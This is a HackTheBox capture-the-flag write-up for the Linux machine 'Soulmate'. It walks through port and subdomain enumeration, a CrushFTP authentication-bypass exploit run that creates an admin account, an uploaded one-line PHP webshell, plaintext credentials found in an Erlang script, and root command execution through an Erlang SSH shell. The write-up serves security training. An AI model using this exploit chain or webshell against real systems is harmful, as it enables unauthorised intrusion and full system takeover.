---
title: HackTheBox - Soulmate
date: 2026-06-13
image: cover.png
tags: [HackTheBox, Easy, Linux]
platform: HackTheBox
os: Linux
difficulty: Easy
points: 45
released: 2025-08-30
ip: 10.10.11.86
boxAvatar: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/2c47fcf9c85c7fbdda73a9c1b54fd60e.png
excerpt: Soulmate is an easy difficulty Linux machine that showcases exploitation of an authentication bypass vulnerability in CrushFTP, allowing players to access an admin user account. By uploading a malicious PHP file to the application's web root, remote command execution is achieved. For privilege escalation, another remote command execution vulnerability in the Erlang/OTP SSH server is exploited to gain root access.
---

# Soulmate

### NMAP Scanning

```sql
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 04:43 EDT
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
4369/tcp open  epmd    syn-ack ttl 63
```

### NMAP Full Scanning

```sql
└─$ nmap -A -sC -sV -p22,80,4369 10.10.11.86 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 04:47 EDT
Nmap scan report for 10.10.11.86
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    ssh_runner: 42547
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   45.53 ms 10.10.14.1
2   46.06 ms 10.10.11.86

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.95 seconds
```

We can see that the website is redirecting us to `soulmate.htb` . So let’s add this to our `/etc/hosts` file:

```sql
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.86     soulmate.htb
```

### Webserver Enumeration

{% image %}

We can see by hovering the login page that the website was created using PHP or by using wappalyzer:

{% image2 %}

So let’s start an directory listing scan with this in mind:

→ feroxbuster:

```sql
└─$ feroxbuster --url http://soulmate.htb/ -x php
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soulmate.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://soulmate.htb/logout.php => login.php
200      GET      238l      611w    11107c http://soulmate.htb/register.php
200      GET      178l      488w     8554c http://soulmate.htb/login.php
200      GET      473l      932w     8657c http://soulmate.htb/assets/css/style.css
200      GET      306l     1061w    16688c http://soulmate.htb/
301      GET        7l       12w      178c http://soulmate.htb/assets => http://soulmate.htb/assets/
403      GET        7l       10w      162c http://soulmate.htb/assets/
301      GET        7l       12w      178c http://soulmate.htb/assets/css => http://soulmate.htb/assets/css/
301      GET        7l       12w      178c http://soulmate.htb/assets/images => http://soulmate.htb/assets/images/
403      GET        7l       10w      162c http://soulmate.htb/assets/css/
302      GET        0l        0w        0c http://soulmate.htb/profile.php => http://soulmate.htb/login
301      GET        7l       12w      178c http://soulmate.htb/assets/images/profiles => http://soulmate.htb/assets/images/profiles/
200      GET      306l     1061w    16688c http://soulmate.htb/index.php
302      GET        0l        0w        0c http://soulmate.htb/dashboard.php => http://soulmate.htb/login
[####################] - 56s   150007/150007  0s      found:14      errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_soulmate_htb_-1760345701.state ...
[####################] - 56s   150007/150007  0s      found:14      errors:0      
[##################>-] - 56s    27983/30000   498/s   http://soulmate.htb/ 
[##################>-] - 56s    27944/30000   502/s   http://soulmate.htb/assets/ 
[##################>-] - 56s    27762/30000   499/s   http://soulmate.htb/assets/css/ 
[##################>-] - 55s    27648/30000   498/s   http://soulmate.htb/assets/images/ 
[##################>-] - 55s    27651/30000   500/s   http://soulmate.htb/assets/images/profiles/
```

→ wfuzz:

```sql
└─$ wfuzz -u http://soulmate.htb/FUZZ.php -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw 12
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soulmate.htb/FUZZ.php
Total requests: 220559

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000001:   200        305 L    1061 W     16688 Ch    "# directory-list-2.3-medium.txt"                                                                                                                                          
000000007:   200        305 L    1061 W     16688 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                                          
000000003:   200        305 L    1061 W     16688 Ch    "# Copyright 2007 James Fisher"                                                                                                                                            
000000015:   200        305 L    1061 W     16688 Ch    "index"                                                                                                                                                                    
000000013:   200        305 L    1061 W     16688 Ch    "#"                                                                                                                                                                        
000000012:   200        305 L    1061 W     16688 Ch    "# on at least 2 different hosts"                                                                                                                                          
000000009:   200        305 L    1061 W     16688 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                                                                      
000000053:   200        177 L    488 W      8554 Ch     "login"                                                                                                                                                                    
000000011:   200        305 L    1061 W     16688 Ch    "# Priority ordered case-sensitive list, where entries were found"                                                                                                         
000000006:   200        305 L    1061 W     16688 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                                                            
000000005:   200        305 L    1061 W     16688 Ch    "# This work is licensed under the Creative Commons"                                                                                                                       
000000010:   200        305 L    1061 W     16688 Ch    "#"                                                                                                                                                                        
000000008:   200        305 L    1061 W     16688 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                                                                               
000000002:   200        305 L    1061 W     16688 Ch    "#"                                                                                                                                                                        
000000004:   200        305 L    1061 W     16688 Ch    "#"                                                                                                                                                                        
000000065:   200        237 L    611 W      11107 Ch    "register"                                                                                                                                                                 
000000086:   302        0 L      0 W        0 Ch        "profile"                                                                                                                                                                  
000001225:   302        0 L      0 W        0 Ch        "logout"                                                                                                                                                                   
000002927:   302        0 L      0 W        0 Ch        "dashboard"
```

We tried everything but unfortunately nothing works - so let’s try to do a DNS enumeration scan:

```sql
└─$ wfuzz -u http://soulmate.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.soulmate.htb" --hw 10
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soulmate.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000003:   302        0 L      0 W        0 Ch        "ftp"
```

And we can see that we have found another host so let’s add it to our `/etc/hosts` file:

```sql
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.86     soulmate.htb ftp.soulmate.htb
```

This is how the webserver looks like:

{% image3 %}

→ whatweb:

```sql
└─$ whatweb http://ftp.soulmate.htb/WebInterface/login.html
http://ftp.soulmate.htb/WebInterface/login.html [200 OK] Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.86], Script[module,text/javascript,text/javascript>const], Title[CrushFTP WebInterface], X-UA-Compatible[chrome=1], nginx[1.18.0]
```

And by using the following exploit we were able to create an administrative account:

```sql
└─$ python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user admin --password Administrator123
[+] Preparing Payloads
  [-] Warming up the target
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: admin
   [*] Password: Administrator123.
```

Inside of the User Manager panel we saw that ben haves access to upload files in the webProd directory:

{% image4 %}

So I updated ben’s password to:

```sql
Username : ben Password : U6DMen
```

So I created a simple webshell and uploaded it:

```sql
└─$ cat webshell.php       
<?php echo system($_GET['cmd']); ?>
```

And by browsing to the initial webserver we can see that we have a successful webshell:

{% image5 %}

Running linpeas we can see some interesting running processes:

```sql
                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                                                                          
                ╚════════════════════════════════════════════════╝                                                                                                                                                                          
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                                                                 
root           1  0.0  0.2 165980 11496 ?        Rs   06:12   0:10 /sbin/init                                                                                                                                                               
root         507  0.1  1.4 118220 56680 ?        S<s  06:12   0:19 /lib/systemd/systemd-journald
root         545  0.0  0.6 289352 27100 ?        SLsl 06:12   0:01 /sbin/multipathd -d -s
root         547  0.0  0.1  25892  6560 ?        Ss   06:12   0:00 /lib/systemd/systemd-udevd
systemd+     607  0.0  0.3  26332 13336 ?        Ss   06:12   0:01 /lib/systemd/systemd-resolved
  └─(Caps) 0x0000000000002000=cap_net_raw
systemd+     608  0.0  0.1  89364  6596 ?        Ssl  06:12   0:02 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         609  0.0  0.2  51148 11904 ?        Ss   06:12   0:00 /usr/bin/VGAuthService
root         610  0.1  0.2 316040  9964 ?        Ssl  06:12   0:19 /usr/bin/vmtoolsd
root         611  0.0  0.0  85616  2828 ?        S<sl 06:12   0:08 /sbin/auditd
_laurel      613  0.0  0.1  11316  7692 ?        S<   06:12   0:08  _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
  └─(Caps) 0x0000000000080004=cap_dac_read_search,cap_sys_ptrace
message+     798  0.0  0.1   8700  5040 ?        Ss   06:12   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         811  0.0  0.0  82832  4004 ?        Ssl  06:12   0:00 /usr/sbin/irqbalance --foreground
root         812  0.0  0.4  32724 19720 ?        Ss   06:12   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         815  0.0  0.1 234516  6864 ?        Ssl  06:12   0:00 /usr/libexec/polkitd --no-debug
syslog       817  0.0  0.1 222404  5660 ?        Ssl  06:12   0:00 /usr/sbin/rsyslogd -n -iNONE
root         819  0.0  0.1  15376  7472 ?        Ss   06:12   0:00 /lib/systemd/systemd-logind
root         820  0.0  0.3 392508 12500 ?        Ssl  06:12   0:00 /usr/libexec/udisks2/udisksd
root         883  0.0  0.3 244236 12092 ?        Ssl  06:12   0:00 /usr/sbin/ModemManager
root        1043  0.0  1.7 2254268 70764 ?       Ssl  06:12   0:07 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

The erlang script contains the following contents:

{% image6 %}

So using those credentials we can switch to the ben user: `{user_passwords, [{"ben", "HouseH0ldings998"}]},`

Unfortunately the user ben doesn’t have sudo permissions:

```sql
ben@soulmate:~$ ls
user.txt
ben@soulmate:~$ sudo -l
[sudo] password for ben: 
Sorry, user ben may not run sudo on soulmate.
ben@soulmate:~$
```

Checking the port running on [localhost](http://localhost) 2222 we can see that it’s the Erlang SSH service:

```sql
ben@soulmate:~$ lsof -i :2222 -S
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     2889  ben    3u  IPv4  73985      0t0  TCP localhost:40278->localhost:2222 (ESTABLISHED)
ben@soulmate:~$ ps -fp 2889
UID          PID    PPID  C STIME TTY          TIME CMD
ben         2889    2824  0 08:48 pts/0    00:00:00 ssh ben@localhost -p 2222
```

So let’s connect to it and get the flag:

```sql
ben@soulmate:~$ ssh ben@localhost -p 2222
ben@localhost's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> os:cmd("cat /root/root.txt").
(ssh_runner@soulmate)1> os:cmd("cat /root/root.txt").

"dbaa672203cd0af66151ffc6b4f73ab5\n"
(ssh_runner@soulmate)2>
```